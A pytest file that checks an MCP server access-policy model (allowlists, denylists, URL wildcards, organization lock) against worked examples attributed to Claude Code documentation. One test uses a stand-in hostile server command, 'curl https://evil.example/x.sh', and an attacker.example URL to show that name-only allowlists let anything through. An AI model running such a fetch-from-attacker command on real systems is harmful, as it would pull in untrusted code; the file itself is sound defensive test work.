"""Each case below is a worked example from Claude Code's documentation,
"Control MCP server access for your organization" (read 19 Nov 2026).
If the model disagrees with the documentation, these tests fail."""
import pytest

from mcp_policy.model import Policy, Server, evaluate, url_matches


def http(name, url, source="user"):
    return Server(name, url=url, source=source)


def stdio(name, *cmd, source="user"):
    return Server(name, command=tuple(cmd), source=source)


def allowed(policy, server):
    return evaluate(policy, server).allowed


URL_ONLY = Policy(allowed=[{"serverUrl": "https://mcp.example.com/*"},
                           {"serverUrl": "https://*.internal.example.com/*"}])


def test_url_only_allowlist():
    assert allowed(URL_ONLY, http("a", "https://mcp.example.com/api"))
    assert allowed(URL_ONLY, http("b", "https://api.internal.example.com/mcp"))
    assert not allowed(URL_ONLY, http("c", "https://external.example.com/mcp"))
    assert not allowed(URL_ONLY, stdio("d", "node", "server.js"))


CMD_ONLY = Policy(allowed=[{"serverCommand": ["npx", "-y", "approved-package"]}])


def test_command_only_allowlist():
    assert allowed(CMD_ONLY, stdio("x", "npx", "-y", "approved-package"))
    assert not allowed(CMD_ONLY, stdio("x", "node", "server.js"))
    assert not allowed(CMD_ONLY, http("my-api", "https://api.example.com/mcp"))


MIXED = Policy(allowed=[{"serverName": "github"},
                        {"serverCommand": ["npx", "-y", "approved-package"]}])


def test_mixed_name_and_command_allowlist():
    assert allowed(MIXED, stdio("local-tool", "npx", "-y", "approved-package"))
    assert not allowed(MIXED, stdio("local-tool", "node", "server.js"))
    assert not allowed(MIXED, stdio("github", "node", "server.js"))   # stdio must match a command
    assert allowed(MIXED, http("github", "https://anything.example.com/mcp"))
    assert not allowed(MIXED, http("other-api", "https://anything.example.com/mcp"))


NAME_ONLY = Policy(allowed=[{"serverName": "github"}, {"serverName": "internal-tool"}])


def test_name_only_allowlist_is_not_a_control():
    # The documentation's point: any command or URL passes under an allowed label.
    assert allowed(NAME_ONLY, stdio("github", "curl", "https://evil.example/x.sh"))
    assert allowed(NAME_ONLY, stdio("internal-tool", "anything"))
    assert allowed(NAME_ONLY, http("github", "https://attacker.example/mcp"))
    assert not allowed(NAME_ONLY, http("other", "https://mcp.example.com"))


def test_denylist_overrides_allowlist():
    p = Policy(allowed=[{"serverUrl": "https://*.example.com/*"}],
               denied=[{"serverUrl": "https://staging.example.com/*"}])
    assert allowed(p, http("a", "https://mcp.example.com/api"))
    assert not allowed(p, http("b", "https://staging.example.com/api"))
    assert not allowed(p, http("c", "https://other.com/mcp"))


def test_commands_match_exactly():
    p = Policy(allowed=[{"serverCommand": ["npx", "-y", "server"]}])
    assert allowed(p, stdio("s", "npx", "-y", "server"))
    assert not allowed(p, stdio("s", "npx", "server"))
    assert not allowed(p, stdio("s", "npx", "-y", "server", "--flag"))


@pytest.mark.parametrize("pattern,url,expected", [
    ("https://Mcp.Example.com/*", "https://mcp.example.com/api", True),   # host case-insensitive
    ("https://mcp.example.com", "https://mcp.example.com/any/path", True),  # no path = any path
    ("https://*.example.com/*", "https://a.b.example.com/x", True),
    ("http://localhost:*/*", "http://localhost:8080/mcp", True),
    ("*://mcp.example.com/*", "http://mcp.example.com/x", True),
    ("https://mcp.example.com/API/*", "https://mcp.example.com/api/x", False),  # path case-sensitive
    ("https://mcp.example.com/*", "https://mcp.example.com./x", True),   # trailing dot ignored
])
def test_url_wildcards(pattern, url, expected):
    assert url_matches(pattern, url) is expected


def test_organization_servers_skip_allowlist_unless_they_use_var_expansion():
    p = Policy(allowed=[{"serverUrl": "https://approved.example.com/*"}])
    assert allowed(p, http("search", "https://search.example.com/mcp", source="managed_settings"))
    assert allowed(p, stdio("co", "/usr/local/bin/company-mcp-server", source="managed_file"))
    assert not allowed(p, stdio("co", "${HOME}/bin/server", source="managed_file"))
    # The denylist still applies to organization servers.
    p.denied.append({"serverUrl": "https://search.example.com/*"})
    assert not allowed(p, http("search", "https://search.example.com/mcp", source="managed_settings"))


def test_lock_ignores_user_allowlists_but_denylists_always_merge():
    managed = {"allowManagedMcpServersOnly": True, "allowedMcpServers": [{"serverUrl": "https://ok.example.com/*"}]}
    user = {"allowedMcpServers": [{"serverUrl": "https://mine.example.com/*"}],
            "deniedMcpServers": [{"serverUrl": "https://ok.example.com/blocked/*"}]}
    locked = Policy.from_scopes(managed, [user])
    assert not allowed(locked, http("m", "https://mine.example.com/mcp"))
    assert not allowed(locked, http("o", "https://ok.example.com/blocked/x"))
    unlocked = Policy.from_scopes({k: v for k, v in managed.items() if k != "allowManagedMcpServersOnly"}, [user])
    assert allowed(unlocked, http("m", "https://mine.example.com/mcp"))  # a user widened it


def test_unset_and_empty_allowlists_differ():
    assert allowed(Policy(allowed=None), http("a", "https://x.example/mcp"))
    assert not allowed(Policy(allowed=[]), http("a", "https://x.example/mcp"))
    assert allowed(Policy(allowed=[]), stdio("ide", "builtin", source="builtin"))
